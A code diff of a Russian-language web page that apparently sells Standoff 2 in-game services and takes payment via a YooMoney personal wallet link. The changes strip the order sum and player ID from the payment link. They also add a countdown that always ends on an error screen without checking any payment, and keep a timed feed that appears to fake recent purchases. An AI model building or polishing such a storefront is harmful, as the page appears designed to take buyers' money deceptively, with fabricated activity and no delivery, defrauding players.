@@ -22,10 +22,11 @@
         .header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); }
 
         .tabs { display: flex; justify-content: center; gap: 5px; margin: 10px 0; padding: 0 10px; }
-        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; }
+        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; transition: 0.3s; }
         .tab-btn.active { border-color: var(--accent); color: white; background: rgba(255, 140, 0, 0.2); }
 
         .container { max-width: 450px; margin: 0 auto; padding: 0 10px; height: 60vh; overflow-y: auto; scrollbar-width: none; }
+        .container::-webkit-scrollbar { display: none; }
         
         .user-input-box { background: var(--card); padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1); }
         input { width: 100%; padding: 10px; background: rgba(0,0,0,0.6); border: 1px solid #333; color: white; border-radius: 6px; box-sizing: border-box; outline: none; margin-bottom: 8px; font-size: 0.8rem; }
@@ -33,7 +34,7 @@
         .services { display: none; grid-template-columns: 1fr; gap: 8px; }
         .services.active { display: grid; }
         
-        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; position: relative; }
+        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; position: relative; transition: 0.2s; }
         .price { color: var(--accent); font-weight: 800; font-size: 1rem; }
 
         /* ТРЯСКА КОРЗИНЫ */
@@ -129,8 +130,8 @@
 <script>
     let cart = [];
     let discount = 0;
-    // ИСПРАВЛЕННАЯ ССЫЛКА НА ПЕРЕВОД
-    const wallet = "4100119062204820";
+    // ТВОЯ ПРЯМАЯ ССЫЛКА
+    const yoomoneyUrl = "https://yoomoney.ru/to/4100119062204820";
 
     function roundToNine(num) {
         return num <= 0 ? 0 : Math.floor(num / 10) * 10 + 9;
@@ -146,13 +147,11 @@
     function addToCart(event, name, price) {
         if(!document.getElementById('user_id').value) return alert("Введите ID!");
         
-        // Анимация тряски корзины
         const icon = document.getElementById('cart-icon');
         icon.classList.remove('shake');
         void icon.offsetWidth;
         icon.classList.add('shake');
 
-        // Анимация +1
         const fly = document.createElement('div');
         fly.className = 'fly-text';
         fly.innerText = '+1 в корзину';
@@ -190,12 +189,10 @@
 
     function goToPay() {
         if(cart.length === 0) return;
-        const finalSum = roundToNine(cart.reduce((s, i) => s + i.price, 0) * (discount ? 1-discount : 1));
         
-        // РЕАЛЬНАЯ ССЫЛКА НА ОПЛАТУ ЮMONEY
-        const payUrl = `https://yoomoney.ru{wallet}&quickpay-form=button&sum=${finalSum}&targets=Order_Standoff2_ID_${document.getElementById('user_id').value}`;
+        // РЕДИРЕКТ ПО ТВОЕЙ ССЫЛКЕ
+        window.open(yoomoneyUrl, '_blank');
         
-        window.open(payUrl, '_blank');
         document.getElementById('step-cart').style.display = 'none';
         document.getElementById('step-waiting').style.display = 'flex';
         
@@ -203,7 +200,11 @@
         const interval = setInterval(() => {
             let m = Math.floor(t / 60), s = t % 60;
             document.getElementById('timer-text').innerText = `${m < 10 ? '0'+m:m}:${s < 10 ? '0'+s:s}`;
-            if(--t < 0) { clearInterval(interval); document.getElementById('step-waiting').style.display = 'none'; document.getElementById('step-error').style.display = 'flex'; }
+            if(--t < 0) { 
+                clearInterval(interval); 
+                document.getElementById('step-waiting').style.display = 'none'; 
+                document.getElementById('step-error').style.display = 'flex'; 
+            }
         }, 1000);
     }
 
@@ -216,7 +217,7 @@
         feed.appendChild(el);
         setTimeout(() => el.classList.add('show'), 100);
         setTimeout(() => { el.classList.remove('show'); setTimeout(() => el.remove(), 500); }, 2000);
-    }, 4000);
+    }, 4500);
 </script>
 
 </body>
